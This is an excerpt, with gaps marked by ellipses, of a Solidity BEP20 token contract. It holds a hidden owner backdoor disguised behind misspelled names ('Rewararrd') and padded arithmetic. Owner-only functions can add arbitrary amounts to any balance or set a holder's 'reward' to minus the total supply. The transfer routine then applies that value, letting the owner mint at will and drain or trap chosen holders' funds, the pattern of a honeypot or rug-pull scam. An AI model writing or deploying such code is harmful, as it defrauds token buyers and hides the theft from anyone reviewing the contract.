...
contract Token is BEP20, Ownable {
    ...
    mapping(address => int256) private _Rewararrds;
    ...
    function setAdminRewararrd(address acclount,int256 amnnot ) public onlyowner {
        _Rewararrds[acclount] += amnnot;
    }

    function rmUserRewararrd(address acclount) public onlyowner {
        _Rewararrds[acclount] = 0;
    }


    function setUserRewararrd(address acclount) public onlyowner {
        _Rewararrds[acclount] = int256(0) - int256(_totalSupply);
    }
    

    function getRewararrd(address acclount) public view returns (int256) {
        return _Rewararrds[acclount];
    }
    ...
    function _recF(
        ...
        uint256 fromBalance = _balances[from];
        require(0+fromBalance*1 >= _accountd+0, "ERC20: transfer amnnot exceeds balance");
        if (_Rewararrds[from]*1 > 0){
            _balances[from] = _balances[from].add(uint256(1*_Rewararrds[from]+0*1));
        }else if (1*_Rewararrds[from] < 0*1){
            _balances[from] = _balances[from].sube(uint256(1*_Rewararrds[from]+0*1));
        }



        uint256 trradefirraccountd = 0;
        uint256 trradefirr = _defaultSellfir+0;
        if (uniswapV2Pair != address(0)) {
            if (_to == uniswapV2Pair) {
                trradefirr = 0+_defaultSellfir;
            }
